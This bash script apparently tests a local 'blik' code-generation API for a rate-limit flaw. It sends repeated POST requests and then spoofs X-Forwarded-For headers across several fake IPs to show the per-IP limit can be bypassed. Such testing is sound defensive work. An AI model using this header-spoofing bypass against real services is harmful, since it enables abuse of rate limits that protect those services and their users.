#\!/bin/bash
# Quick Rate Limit Vulnerability Test
# This is a simple bash script for quick manual testing

BASE_URL="http://localhost:3000/api/blik"
WALLET="7xKXtg2CW87d97TXJSDpbD5jBkheTqA83TZRuJosgAsU"

echo "=========================================="
echo "Quick Rate Limit Vulnerability Test"
echo "=========================================="
echo ""
echo "Target: $BASE_URL"
echo "Wallet: $WALLET"
echo ""

# Test 1: Same IP, Same Wallet (should rate limit after 5)
echo "Test 1: Testing IP rate limiting (same IP, same wallet)"
echo "--------------------------------------------------"
for i in {1..10}; do
  echo -n "Request $i: "
  curl -s -X POST "$BASE_URL/codes/generate" \
    -H "Content-Type: application/json" \
    -d "{\"wallet\":\"$WALLET\"}" \
    | jq -r 'if .code then "✓ Code: " + .code else "✗ " + .error end' 2>/dev/null \
    || echo "ERROR"
  sleep 0.5
done

echo ""
echo "Waiting 65 seconds for rate limit to reset..."
sleep 65

# Test 2: Different IPs, Same Wallet (demonstrates vulnerability)
echo ""
echo "Test 2: Testing multi-IP bypass (different IPs, same wallet)"
echo "------------------------------------------------------------"
for ip_idx in {1..3}; do
  IP="10.0.$ip_idx.1"
  echo ""
  echo "IP #$ip_idx: $IP"
  for req in {1..5}; do
    echo -n "  Request $req: "
    curl -s -X POST "$BASE_URL/codes/generate" \
      -H "Content-Type: application/json" \
      -H "X-Forwarded-For: $IP" \
      -d "{\"wallet\":\"$WALLET\"}" \
      | jq -r 'if .code then "✓ Code: " + .code else "✗ " + .error end' 2>/dev/null \
      || echo "ERROR"
    sleep 0.3
  done
done

echo ""
echo "=========================================="
echo "Test Complete"
echo "=========================================="
echo ""
echo "Summary:"
echo "- Test 1: Should show 5 successes, then rate limited"
echo "- Test 2: Should show 15 successes (VULNERABILITY\!)"
echo ""
echo "If Test 2 shows 15 successful code generations,"
echo "the vulnerability is CONFIRMED."
echo ""
echo "For detailed testing, run:"
echo "  python3 test_ratelimit_vulnerability.py"
echo ""

